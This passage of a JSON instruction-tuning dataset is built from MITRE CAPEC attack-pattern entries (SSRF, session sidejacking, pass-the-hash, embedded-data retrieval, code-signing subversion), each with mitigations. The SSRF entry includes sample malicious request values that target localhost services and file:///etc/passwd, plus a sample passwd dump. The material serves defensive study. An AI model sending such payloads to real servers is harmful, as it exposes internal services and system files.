          "xhtml:p": "An adversary exploits improper input validation by submitting maliciously crafted input to a target application running on a server, with the goal of forcing the server to make a request either to itself, to web services running in the server\u2019s internal network, or to external third parties. If successful, the adversary\u2019s request will be made with the server\u2019s privilege level, bypassing its authentication controls. This ultimately allows the adversary to access sensitive data, execute commands on the server\u2019s network, and make external requests with the stolen identity of the server. Server Side Request Forgery attacks differ from Cross Site Request Forgery attacks in that they target the server itself, whereas CSRF attacks exploit an insecure user authentication mechanism to perform unauthorized actions on the user's behalf."
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "115"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Find target application] Find target web application that accepts a user input and retrieves data from the server"
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Examine existing application requests] Examine HTTP/GET requests to view the URL query format. Adversaries test to see if this type of attack is possible through weaknesses in an application's protection to Server Side Request Forgery",
              "Technique": [
                "Attempt manipulating the URL to retrieve an error response/code from the server to determine if URL/request validation is done.",
                "Use a list of XSS probe strings to specify as parameters to known URLs. If possible, use probe strings with unique identifiers.",
                "Create a GET request with a common server file path such as /etc/passwd as a parameter and examine output."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Malicious request] Adversary crafts a malicious URL request that assumes the privilege level of the server to query internal or external network services and sends the request to the application"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Server must be running a web application that processes HTTP requests."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Medium",
              "#text": "The adversary will have to detect the vulnerability through an intermediary service or specify maliciously crafted URLs and analyze the server response."
            },
            {
              "@Level": "High",
              "#text": "The adversary will be required to access internal resources, extract information, or leverage the services running on the server to perform unauthorized actions such as traversing the local network or routing a reflected TCP DDoS through them."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "[None] No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Integrity",
                "Confidentiality",
                "Availability"
              ],
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Availability",
              "Impact": "Resource Consumption"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Handling incoming requests securely is the first line of action to mitigate this vulnerability. This can be done through URL validation.",
            "Further down the process flow, examining the response and verifying that it is as expected before sending would be another way to secure the server.",
            "Allowlist the DNS name or IP address of every service the web application is required to access is another effective security measure. This ensures the server cannot make external requests to arbitrary services.",
            "Requiring authentication for local services adds another layer of security between the adversary and internal services running on the server. By enforcing local authentication, an adversary will not gain access to all internal services only with access to the server.",
            "Enforce the usage of relevant URL schemas. By limiting requests be made only through HTTP or HTTPS, for example, attacks made through insecure schemas such as file://, ftp://, etc. can be prevented."
          ]
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:p": [
                "An e-commerce website allows a customer to filter results by specific categories. When the customer selects the category of choice, the web shop queries a back-end service to retrieve the requested products. The request may look something like:",
                "A malicious user can modify the request URL to look like this instead:",
                "or",
                "or",
                "If the exploit is successful, the server may return the data requested by the adversary"
              ],
              "xhtml:div": [
                {
                  "@style": "margin-left:1em;",
                  "@class": "informative",
                  "xhtml:p": [
                    "POST /product/category HTTP/1.0",
                    "Content-Type: application/x-www-form-urlencoded",
                    "Content-Length: 200",
                    "vulnerableService=http://vulnerableshop.net:8080/product/category/check%3FcategoryName%3DsomeCategory"
                  ]
                },
                {
                  "@style": "margin-left:1em;",
                  "@class": "attack",
                  "xhtml:p": [
                    "POST /product/category HTTP/1.0",
                    "Content-Type: application/x-www-form-urlencoded",
                    "Content-Length: 200",
                    "vulnerableService=http://localhost/server-status"
                  ]
                },
                {
                  "@style": "margin-left:1em;",
                  "@class": "attack",
                  "xhtml:p": "vulnerableService = file:///etc/passwd"
                },
                {
                  "@style": "margin-left:1em;",
                  "@class": "attack",
                  "xhtml:p": "vulnerableService=dict://localhost:12345/info"
                },
                {
                  "@style": "margin-left:1em;",
                  "@class": "bad",
                  "xhtml:p": [
                    "root:!:0:0::/:/usr/bin/ksh",
                    "daemon:!:1:1::/etc:",
                    "bin:!:2:2::/bin:",
                    "sys:!:3:3::/usr/sys:",
                    "adm:!:4:4::/var/adm:",
                    "uucp:!:5:5::/usr/lib/uucp:",
                    "guest:!:100:100::/home/guest:",
                    "nobody:!:4294967294:4294967294::/:",
                    "lpd:!:9:4294967294::/:",
                    "lp:*:11:11::/var/spool/lp:/bin/false",
                    "invscout:*:200:1::/var/adm/invscout:/usr/bin/ksh",
                    "nuucp:*:6:5:uucp login user:/var/spool/uucppublic:/usr/sbin/uucp/uucico",
                    "paul:!:201:1::/home/paul:/usr/bin/ksh",
                    "jdoe:*:202:1:My name:/home/myname:/usr/bin/ksh"
                  ]
                }
              ]
            },
            {
              "xhtml:p": "The CallStranger attack is an observed example of SSRF. It specifically targets the UPnP (Universal Plug and Play) protocol used by various network devices and gaming consoles. To execute the attack, an adversary performs a scan of the LAN to discover UPnP enabled devices, and subsequently a list of UPnP services they use. Once the UPnP service endpoints are listed, a vulnerability in the UPnP protocol is used to send these endpoints as encrypted to a verification server via the UPnP Callback method. Because the encryption is done on the client side, the server returns an encrypted list of services which is decrypted on the client side. The adversary then has a list of services running the vulnerable UPnP protocol, which the adversary can leverage to make spoofed requests. [REF-646]"
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "918"
            },
            {
              "@CWE_ID": "20"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-644"
            },
            {
              "@External_Reference_ID": "REF-645"
            },
            {
              "@External_Reference_ID": "REF-646"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2021-06-24"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Session Sidejacking (CAPEC ID: 102)",
    "context": "",
    "output": "required resources:\nA packet sniffing tool, such as wireshark, can be used to capture session information.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A packet sniffing tool, such as wireshark, can be used to capture session information.",
      "@Name": "Session Sidejacking (CAPEC ID: 102)",
      "attack_ptrn": {
        "@ID": "102",
        "@Name": "Session Sidejacking",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "Session sidejacking takes advantage of an unencrypted communication channel between a victim and target system. The attacker sniffs traffic on a network looking for session tokens in unencrypted traffic. Once a session token is captured, the attacker performs malicious actions by using the stolen token with the targeted application to impersonate the victim. This attack is a specific method of session hijacking, which is exploiting a valid session token to gain unauthorized access to a target system or information. Other methods to perform a session hijacking are session fixation, cross-site scripting, or compromising a user or server machine and stealing the session token.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "593"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Detect Unprotected Session Token Transfer] The attacker sniffs on the wireless network to detect unencrypted traffic that contains session tokens.",
              "Technique": "The attacker uses a network sniffer tool like ferret or hamster to monitor the wireless traffic at a WiFi hotspot while examining it for evidence of transmittal of session tokens in unencrypted or recognizably encrypted form. An attacker applies their knowledge of the manner by which session tokens are generated and transmitted by various target systems to identify the session tokens."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Capture session token] The attacker uses sniffing tools to capture a session token from traffic."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Insert captured session token] The attacker attempts to insert a captured session token into communication with the targeted application to confirm viability for exploitation."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Session Token Exploitation] The attacker leverages the captured session token to interact with the targeted application in a malicious fashion, impersonating the victim."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An attacker and the victim are both using the same WiFi network.",
            "The victim has an active session with a target system.",
            "The victim is not using a secure channel to communicate with the target system (e.g. SSL, VPN, etc.)",
            "The victim initiated communication with a target system that requires transfer of the session token or the target application uses AJAX and thereby periodically \"rings home\" asynchronously using the session token"
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Easy to use tools exist to automate this attack."
          }
        },
        "Resources_Required": {
          "Resource": "A packet sniffing tool, such as wireshark, can be used to capture session information."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Make sure that HTTPS is used to communicate with the target system. Alternatively, use VPN if possible. It is important to ensure that all communication between the client and the server happens via an encrypted secure channel.",
            "Modify the session token with each transmission and protect it with cryptography. Add the idea of request sequencing that gives the server an ability to detect replay attacks."
          ]
        },
        "Example_Instances": {
          "Example": "The attacker and the victim are using the same WiFi public hotspot. When the victim connects to the hotspot, they has a hosted e-mail account open. This e-mail account uses AJAX on the client side which periodically asynchronously connects to the server side and transfers, amongst other things, the user's session token to the server. The communication is supposed to happen over HTTPS. However, the configuration in the public hotspot initially disallows the HTTPS connection (or any other connection) between the victim and the hosted e-mail servers because the victim first needs to register with the hotspot. The victim does so, but their e-mail client already defaulted to using a connection without HTTPS, since it was denied access the first time. Victim's session token is now flowing unencrypted between the victim's browser and the hosted e-mail servers. The attacker leverages this opportunity to capture the session token and gain access to the victim's hosted e-mail account."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "294"
            },
            {
              "@CWE_ID": "522"
            },
            {
              "@CWE_ID": "523"
            },
            {
              "@CWE_ID": "319"
            },
            {
              "@CWE_ID": "614"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Content Spoofing Via Application API Manipulation (CAPEC ID: 389), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nA software program that allows the use of adversary-in-the-middle communications between the client and server, such as an adversary-in-the-middle proxy.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A software program that allows the use of adversary-in-the-middle communications between the client and server, such as an adversary-in-the-middle proxy.",
      "@Name": "Content Spoofing Via Application API Manipulation (CAPEC ID: 389)",
      "attack_ptrn": {
        "@ID": "389",
        "@Name": "Content Spoofing Via Application API Manipulation",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, spam-like content, or links to the attackers' code. In general, content-spoofing within an application API can be employed to stage many different types of attacks varied based on the attackers' intent. The techniques require use of specialized software that allow the attacker to use adversary-in-the-middle (CAPEC-94) communications between the web browser and the remote system.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "384"
          }
        },
        "Prerequisites": {
          "Prerequisite": "Targeted software is utilizing application framework APIs"
        },
        "Resources_Required": {
          "Resource": "A software program that allows the use of adversary-in-the-middle communications between the client and server, such as an adversary-in-the-middle proxy."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "353"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-327"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated @Abstraction"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Description, Resources_Required"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Use of Captured Hashes (Pass The Hash) (CAPEC ID: 644)",
    "context": "",
    "output": "The resources required to execute Use of Captured Hashes (Pass The Hash) (CAPEC ID: 644) are the following: A list of known Window credential hash value pairs for the targeted domain.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A list of known Window credential hash value pairs for the targeted domain.",
      "@Name": "Use of Captured Hashes (Pass The Hash) (CAPEC ID: 644)",
      "attack_ptrn": {
        "@ID": "644",
        "@Name": "Use of Captured Hashes (Pass The Hash)",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary obtains (i.e. steals or purchases) legitimate Windows domain credential hash values to access systems within the domain that leverage the Lan Man (LM) and/or NT Lan Man (NTLM) authentication protocols.",
        "Extended_Description": {
          "xhtml:p": "When authenticating via LM or NTLM, an authenticating account's plaintext credentials are not required by the protocols for successful authentication. Instead, the hashed credentials are used to determine if an authentication attempt is valid. If an adversary can obtain an account's hashed credentials, the hash values can then be passed to a system or service to authenticate, without needing to brute-force the hashes to obtain their cleartext values. Successful Pass The Hash attacks result in the adversary fully authenticating as the targeted account, which can further allow the adversary to laterally move within the network, impersonate a legitimate user, and/or download/install malware to systems within the domain. This technique can be performed against any operating system that leverages the LM or NTLM protocols even if the operating system is not Windows-based, since these systems/accounts may still authenticate to a Windows domain."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "653"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "165"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "549"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "545"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Acquire known Windows credential hash value pairs] The adversary must obtain known Windows credential hash value pairs of accounts that exist on the domain.",
              "Technique": [
                "An adversary purchases breached Windows credential hash value pairs from the dark web.",
                "An adversary conducts a sniffing attack to steal Windows credential hash value pairs as they are transmitted.",
                "An adversary gains access to a Windows domain system/files and exfiltrates Windows credential hash value pairs.",
                "An adversary examines outward-facing configuration and properties files to discover hardcoded Windows credential hash value pairs."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Attempt domain authentication] Try each Windows credential hash value pair until the target grants access.",
              "Technique": "Manually or automatically enter each Windows credential hash value pair through the target's interface."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within the domain"
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Spoofing] Malicious data can be injected into the target system or into other systems on the domain. The adversary can also pose as a legitimate domain user to perform social engineering attacks."
            },
            {
              "Step": "5",
              "Phase": "Exploit",
              "Description": "[Data Exfiltration] The adversary can obtain sensitive data contained within domain systems or applications."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The system/application is connected to the Windows domain.",
            "The system/application leverages the Lan Man (LM) and/or NT Lan Man (NTLM) authentication protocols.",
            "The adversary possesses known Windows credential hash value pairs that exist on the target domain."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Once an adversary obtains a known Windows credential hash value pair, leveraging it is trivial."
          }
        },
        "Resources_Required": {
          "Resource": "A list of known Window credential hash value pairs for the targeted domain."
        },
        "Indicators": {
          "Indicator": [
            "Authentication attempts use credentials that have been used previously by the account in question.",
            "Authentication attempts are originating from IP addresses or locations that are inconsistent with the user's normal IP addresses or locations.",
            "Data is being transferred and/or removed from systems/applications within the network.",
            "Suspicious or Malicious software is downloaded/installed on systems within the domain.",
            "Messages from a legitimate user appear to contain suspicious links or communications not consistent with the user's normal behavior."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authentication"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Authorization"
              ],
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Prevent the use of Lan Man and NT Lan Man authentication on severs and apply patch KB2871997 to Windows 7 and higher systems.",
            "Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the domain network.",
            "Monitor system and domain logs for abnormal credential access.",
            "Create a strong password policy and ensure that your system enforces this policy.",
            "Leverage system penetration testing and other defense in depth methods to determine vulnerable systems within a domain."
          ]
        },
        "Example_Instances": {
          "Example": [
            "Adversaries exploited the Zoom video conferencing application during the 2020 COVID-19 pandemic to exfiltrate Windows domain credential hash value pairs from a target system. The attack entailed sending Universal Naming Convention (UNC) paths within the Zoom chat window of an unprotected Zoom call. If the victim clicked on the link, their Windows usernames and the corresponding Net-NTLM-v2 hashes were sent to the address contained in the link. The adversary was then able to infiltrate and laterally move within the Windows domain by passing the acquired credentials to shared network resources. This further provided adversaries with access to Outlook servers and network storage devices. [REF-575]",
            "Operation Soft Cell, which has been underway since at least 2012, leveraged a modified Mimikatz that dumped NTLM hashes. The acquired hashes were then used to authenticate to other systems within the network via Pass The Hash attacks. [REF-580]"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "522"
            },
            {
              "@CWE_ID": "836"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "294"
            },
            {
              "@CWE_ID": "308"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1550.002",
            "Entry_Name": "Use Alternate Authentication Material:Pass The Hash"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-575"
            },
            {
              "@External_Reference_ID": "REF-580"
            },
            {
              "@External_Reference_ID": "REF-581"
            },
            {
              "@External_Reference_ID": "REF-582"
            },
            {
              "@External_Reference_ID": "REF-583"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Date": "2018-07-31"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Consequences, Description, Example_Instances, Execution_Flow, Indicators, Likelihood_Of_Attack, Mitigations, Prerequisites, References, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Skills_Required, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Retrieve Embedded Sensitive Data (CAPEC ID: 37), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nThe attacker must possess access to the system or code being exploited. Such access, for this set of attacks, will likely be physical. The attacker will make use of reverse engineering technologies, perhaps for data or to extract functionality from the binary. Such tool use may be as simple as \"Strings\" or a hex editor. Removing functionality may require the use of only a hex editor, or may require aspects of the toolchain used to construct the application: for instance the Adobe Flash development environment. Attacks of this nature do not require network access or undue CPU, memory, or other hardware-based resources.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The attacker must possess access to the system or code being exploited. Such access, for this set of attacks, will likely be physical. The attacker will make use of reverse engineering technologies, perhaps for data or to extract functionality from the binary. Such tool use may be as simple as \"Strings\" or a hex editor. Removing functionality may require the use of only a hex editor, or may require aspects of the toolchain used to construct the application: for instance the Adobe Flash development environment. Attacks of this nature do not require network access or undue CPU, memory, or other hardware-based resources.",
      "@Name": "Retrieve Embedded Sensitive Data (CAPEC ID: 37)",
      "attack_ptrn": {
        "@ID": "37",
        "@Name": "Retrieve Embedded Sensitive Data",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker examines a target system to find sensitive data that has been embedded within it. This information can reveal confidential contents, such as account numbers or individual keys/credentials that can be used as an intermediate step in a larger attack.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "167"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify Target] Attacker identifies client components to extract information from. These may be binary executables, class files, shared libraries (e.g., DLLs), configuration files, or other system files.",
              "Technique": [
                "Binary file extraction. The attacker extracts binary files from zips, jars, wars, PDFs or other composite formats.",
                "Package listing. The attacker uses a package manifest provided with the software installer, or the filesystem itself, to identify component files suitable for attack."
              ]
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "[Retrieve Embedded Data] The attacker then uses a variety of techniques, such as sniffing, reverse-engineering, and cryptanalysis to retrieve the information of interest.",
              "Technique": [
                "API Profiling. The attacker monitors the software's use of registry keys or other operating system-provided storage locations that can contain sensitive information.",
                "Execution in simulator. The attacker physically removes mass storage from the system and explores it using a simulator, external system, or other debugging harness.",
                "Common decoding methods. The attacker applies methods to decode such encodings and compressions as Base64, unzip, unrar, RLE decoding, gzip decompression and so on.",
                "Common data typing. The attacker looks for common file signatures for well-known file types (JPEG, TIFF, ASN.1, LDIF, etc.). If the signatures match, they attempt decoding in that format."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "In order to feasibly execute this type of attack, some valuable data must be present in client software.",
            "Additionally, this information must be unprotected, or protected in a flawed fashion, or through a mechanism that fails to resist reverse engineering, statistical, or other attack."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The attacker must possess knowledge of client code structure as well as ability to reverse-engineer or decompile it or probe it in other ways. This knowledge is specific to the technology and language used for the client distribution"
          }
        },
        "Resources_Required": {
          "Resource": "The attacker must possess access to the system or code being exploited. Such access, for this set of attacks, will likely be physical. The attacker will make use of reverse engineering technologies, perhaps for data or to extract functionality from the binary. Such tool use may be as simple as \"Strings\" or a hex editor. Removing functionality may require the use of only a hex editor, or may require aspects of the toolchain used to construct the application: for instance the Adobe Flash development environment. Attacks of this nature do not require network access or undue CPU, memory, or other hardware-based resources."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Example_Instances": {
          "Example": [
            "Using a tool such as 'strings' or similar to pull out text data, perhaps part of a database table, that extends beyond what a particular user's purview should be.",
            "An attacker can also use a decompiler to decompile a downloaded Java applet in order to look for information such as hardcoded IP addresses, file paths, passwords or other such contents.",
            "Attacker uses a tool such as a browser plug-in to pull cookie or other token information that, from a previous user at the same machine (perhaps a kiosk), allows the attacker to log in as the previous user."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "226"
            },
            {
              "@CWE_ID": "311"
            },
            {
              "@CWE_ID": "525"
            },
            {
              "@CWE_ID": "312"
            },
            {
              "@CWE_ID": "314"
            },
            {
              "@CWE_ID": "315"
            },
            {
              "@CWE_ID": "318"
            },
            {
              "@CWE_ID": "1239"
            },
            {
              "@CWE_ID": "1258"
            },
            {
              "@CWE_ID": "1266"
            },
            {
              "@CWE_ID": "1272"
            },
            {
              "@CWE_ID": "1278"
            },
            {
              "@CWE_ID": "1301"
            },
            {
              "@CWE_ID": "1330"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1005",
              "Entry_Name": "Data from Local System"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1552.004",
              "Entry_Name": "Unsecured Credentials: Private Keys"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Activation_Zone, Attack_Phases, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Vulnerabilities, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow, Related_Weaknesses, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-11-09",
            "#text": "Lifting Data Embedded in Client Distributions"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Subvert Code-signing Facilities (CAPEC ID: 68), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nThe Attacker needs no special resources beyond the listed prerequisites in order to conduct this style of attack.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The Attacker needs no special resources beyond the listed prerequisites in order to conduct this style of attack.",
      "@Name": "Subvert Code-signing Facilities (CAPEC ID: 68)",
      "attack_ptrn": {
        "@ID": "68",
        "@Name": "Subvert Code-signing Facilities",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "Many languages use code signing facilities to vouch for code's identity and to thus tie code to its assigned privileges within an environment. Subverting this mechanism can be instrumental in an attacker escalating privilege. Any means of subverting the way that a virtual machine enforces code signing classifies for this style of attack.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "233"
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "A framework-based language that supports code signing (such as, and most commonly, Java or .NET)",
            "Deployed code that has been signed by its authoring vendor, or a partner.",
            "The attacker will, for most circumstances, also need to be able to place code in the victim container. This does not necessarily mean that they will have to subvert host-level security, except when explicitly indicated."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Subverting code signing is not a trivial activity. Most code signing and verification schemes are based on use of cryptography and the attacker needs to have an understanding of these cryptographic operations in good detail. Additionally the attacker also needs to be aware of the way memory is assigned and accessed by the container since, often, the only way to subvert code signing would be to patch the code in memory. Finally, a knowledge of the platform specific mechanisms of signing and verifying code is a must."
          }
        },
        "Resources_Required": {
          "Resource": "The Attacker needs no special resources beyond the listed prerequisites in order to conduct this style of attack."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Access Control",
              "Authorization"
            ],
            "Impact": "Gain Privileges"
          }
        },
